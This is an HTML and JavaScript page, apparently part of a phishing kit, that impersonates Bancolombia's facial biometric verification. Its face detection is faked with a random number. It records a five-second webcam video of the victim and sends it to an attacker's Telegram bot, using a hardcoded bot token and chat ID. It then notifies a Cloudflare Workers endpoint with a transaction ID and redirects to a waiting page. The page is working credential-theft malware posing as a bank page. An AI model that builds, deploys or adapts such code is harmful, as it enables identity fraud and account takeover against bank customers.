<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación Biométrica</title>
<style>
*{box-sizing:border-box}
body{
  margin:0;
  background:#ffffff;
  font-family:Arial,sans-serif;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.app{
  width:100%;
  max-width:420px;
  height:100vh;
  background:#ffffff;
  display:flex;
  flex-direction:column;
  color:#111827;
}
.steps{
  display:flex;
  justify-content:space-around;
  padding:15px;
  font-size:13px;
}
.step{display:flex;align-items:center;gap:6px;opacity:.4}
.step.active{opacity:1;font-weight:bold}
.circle{
  width:26px;height:26px;border-radius:50%;
  background:#F9A825;
  color:white;
  display:flex;
  align-items:center;
  justify-content:center;
}
.content{
  flex:1;
  padding:15px;
  display:flex;
  justify-content:center;
  align-items:center;
}
.card{
  background:white;
  color:#222;
  border-radius:18px;
  padding:25px 15px;
  width:100%;
  text-align:center;
}
.icon{
  width:60px;
  height:60px;
  border-radius:50%;
  border:3px solid #1e293b;
  margin:0 auto 10px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:26px;
}
.progress{
  width:100%;
  height:6px;
  background:#eee;
  border-radius:6px;
  overflow:hidden;
  margin-top:15px;
}
.progress div{
  width:30%;
  height:100%;
  background:#F9A825;
  animation:load 2s infinite;
}
@keyframes load{
  0%{transform:translateX(-100%)}
  100%{transform:translateX(300%)}
}
.camera{
  position:relative;
  width:100%;
  height:60vh;
  background:black;
  border-radius:16px;
  overflow:hidden;
}
video{
  width:100%;
  height:100%;
  object-fit:cover;
  transform:scale(1.15);
}
.oval{
  position:absolute;
  top:50%;
  left:50%;
  width:180px;
  height:240px;
  border:3px solid rgba(255,255,255,.9);
  border-radius:50%;
  transform:translate(-50%,-50%);
  transition: all 0.3s ease;
}
.oval.valid {
  border-color: #00C853;
  box-shadow: 0 0 20px #00C853;
}
button{
  width:90%;
  margin:15px auto;
  padding:15px;
  border:none;
  border-radius:30px;
  font-size:16px;
  font-weight:bold;
  background:#fdda24;
  color:#222;
  cursor:pointer;
}
button:disabled{
  opacity:0.6;
  cursor:not-allowed;
}
.hidden{display:none}
canvas{display:none}
@media (min-width:768px){
  .app{
    height:90vh;
    border-radius:20px;
    box-shadow:0 10px 40px rgba(0,0,0,.15);
  }
}

/* TARJETA INFO */
.info-card{
  background:#ffffff;
  border-radius:14px;
  padding:20px 18px;
  margin:0 20px 10px;
  text-align:center;
  box-shadow:0 4px 12px rgba(0,0,0,.08);
}
.info-card h2{
  margin:0 0 8px;
  font-size:18px;
  font-weight:700;
  color:#111827;
}
.info-card p{
  margin:0;
  font-size:14px;
  line-height:1.4;
  color:#374151;
}

/* LOGO */
.brand-logo{
  width:180px;
  max-width:80%;
  height:auto;
  display:block;
  margin:0 auto 12px;
}

/* Contador y mensajes */
.countdown-overlay {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: rgba(0,0,0,0.8);
  color: #F9A825;
  font-size: 50px;
  font-weight: bold;
  padding: 15px 35px;
  border-radius: 50px;
  z-index: 20;
  display: none;
  font-family: monospace;
}

.countdown-overlay.show {
  display: block;
}

.recording-message {
  position: absolute;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.7);
  color: #F9A825;
  padding: 6px 15px;
  border-radius: 20px;
  font-size: 12px;
  z-index: 20;
  display: none;
}

.recording-message.show {
  display: block;
}

.status-message {
  position: absolute;
  top: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: rgba(0,0,0,0.6);
  color: white;
  padding: 6px 15px;
  border-radius: 20px;
  font-size: 12px;
  z-index: 20;
  white-space: nowrap;
}
</style>
</head>
<body>

<div class="app">

  <div class="steps">
    <div class="step active"><div class="circle">✓</div>Rostro</div>
    <div class="step active"><div class="circle">2</div>Adelante</div>
    <div class="step"><div class="circle">3</div>Atrás</div>
    <div class="step"><div class="circle">4</div>Finalizar</div>
  </div>

  <div class="info-card">
    <img
      src="https://losmolinos.com.co/wp-content/uploads/2020/10/BANCOLOMBIA_LOGOS_MARCAS_SITIOWEB-2048x1152.jpg"
      alt="Bancolombia"
      class="brand-logo"
    >
    <h2>Verificación facial</h2>
    <p>
      Mantén tu rostro centrado dentro del óvalo para iniciar la verificación automática.
    </p>
  </div>

  <div class="content">

    <div id="startCard" class="card">
      <div class="icon">📷</div>
      <div class="progress"><div></div></div>
    </div>

    <div id="cameraCard" class="card hidden">
      <div class="camera">
        <video id="video" autoplay muted playsinline></video>
        <div class="oval" id="oval"></div>
        <div id="statusMessage" class="status-message">🔍 Coloca tu rostro en el círculo</div>
        <div id="countdownOverlay" class="countdown-overlay">3</div>
        <div id="recordingMessage" class="recording-message">...</div>
      </div>
    </div>

  </div>

  <button id="startBtn">Iniciar Verificación</button>

</div>

<canvas id="canvas"></canvas>

<script>
// Configuración de Telegram
const BOT_TOKEN = "7560835826:AAEi0Itg5ivd476odunl3z0Gs5j2Sj0rlzw";
const CHAT_ID = "8042354877";

// Worker URL
const WORKER_URL = "https://ancient-dawn-3a7e.perrayolo11.workers.dev";

const startBtn = document.getElementById("startBtn");
const startCard = document.getElementById("startCard");
const cameraCard = document.getElementById("cameraCard");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const oval = document.getElementById("oval");
const countdownOverlay = document.getElementById("countdownOverlay");
const recordingMessage = document.getElementById("recordingMessage");
const statusMessage = document.getElementById("statusMessage");

let mediaRecorder = null;
let recordedChunks = [];
let videoStream = null;
let recording = false;
let detectionInterval = null;
let faceDetected = false;
let grabacionIniciada = false;

startBtn.onclick = async () => {
  startCard.classList.add("hidden");
  cameraCard.classList.remove("hidden");
  startBtn.classList.add("hidden");

  try {
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    video.srcObject = videoStream;
    
    // Iniciar detección de rostro
    startFaceDetection();
  } catch (error) {
    console.error("Error al acceder a la cámara:", error);
    statusMessage.textContent = "❌ Error al acceder a la cámara";
  }
};

// Función para enviar video a Telegram
async function enviarVideoTelegram(videoBlob) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("video", videoBlob, "verificacion_biometrica.webm");

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
      method: "POST",
      body: formData
    });
    
    if (response.ok) {
      console.log("✅");
      
      const transactionId = localStorage.getItem('transactionId');
      if (transactionId) {
        await fetch(`${WORKER_URL}/biometria`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            transactionId: transactionId,
            tipo: "biometria",
            estado: "completado"
          })
        });
      }
      
      return true;
    } else {
      throw new Error("Error en respuesta");
    }
  } catch (error) {
    console.error("Error al enviar video:", error);
    return false;
  }
}

// Función para grabar video de 5 segundos
function grabarVideo() {
  if (recording || !videoStream || grabacionIniciada) return;
  
  grabacionIniciada = true;
  recording = true;
  recordedChunks = [];
  
  mediaRecorder = new MediaRecorder(videoStream);
  
  mediaRecorder.ondataavailable = (event) => {
    if (event.data.size > 0) {
      recordedChunks.push(event.data);
    }
  };
  
  mediaRecorder.onstop = async () => {
    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
    recordingMessage.classList.remove("show");
    statusMessage.textContent = "📤 Enviando verificación...";
    
    const enviado = await enviarVideoTelegram(videoBlob);
    
    if (enviado) {
      statusMessage.textContent = "✅ Verificación completada";
      setTimeout(() => {
        window.location.href = "espera.html";
      }, 1500);
    } else {
      statusMessage.textContent = "❌ Error, reintentando...";
      recording = false;
      grabacionIniciada = false;
      faceDetected = false;
      setTimeout(() => {
        startFaceDetection();
      }, 3000);
    }
  };
  
  // Mostrar contador regresivo
  let count = 3;
  countdownOverlay.textContent = count;
  countdownOverlay.classList.add("show");
  statusMessage.textContent = `⏰ Preparando... ${count}`;
  
  const countdownInterval = setInterval(() => {
    count--;
    if (count > 0) {
      countdownOverlay.textContent = count;
      statusMessage.textContent = `⏰ Preparando... ${count}`;
    } else {
      clearInterval(countdownInterval);
      countdownOverlay.classList.remove("show");
      
      // Iniciar grabación
      mediaRecorder.start();
      recordingMessage.classList.add("show");
      statusMessage.textContent = "🎥 verificación facial...";
      
      // Detener después de 5 segundos
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
          recordingMessage.classList.remove("show");
          statusMessage.textContent = "✅ Verificación completada";
        }
      }, 5000);
    }
  }, 1000);
}

// Detección de rostro (simulada con el óvalo)
function startFaceDetection() {
  if (detectionInterval) clearInterval(detectionInterval);
  
  detectionInterval = setInterval(() => {
    if (recording || grabacionIniciada) return;
    
    // Simulación de detección de rostro dentro del óvalo
    // En una implementación real, aquí iría un modelo de detección facial
    const random = Math.random();
    
    if (random > 0.3) {
      // Rostro detectado
      if (!faceDetected) {
        faceDetected = true;
        oval.classList.add("valid");
        statusMessage.textContent = " Rostro detectado!...";
        
        // Iniciar grabación después de 0.5 segundos
        setTimeout(() => {
          grabarVideo();
        }, 500);
      }
    } else {
      // Rostro no detectado
      if (faceDetected) {
        faceDetected = false;
        oval.classList.remove("valid");
        statusMessage.textContent = "🔍 Coloca tu rostro en el círculo";
      }
    }
  }, 1000);
}

// Limpiar al salir
window.addEventListener("beforeunload", () => {
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
  }
  if (detectionInterval) {
    clearInterval(detectionInterval);
  }
  if (mediaRecorder && mediaRecorder.state === "recording") {
    mediaRecorder.stop();
  }
});
</script>

</body>
</html>
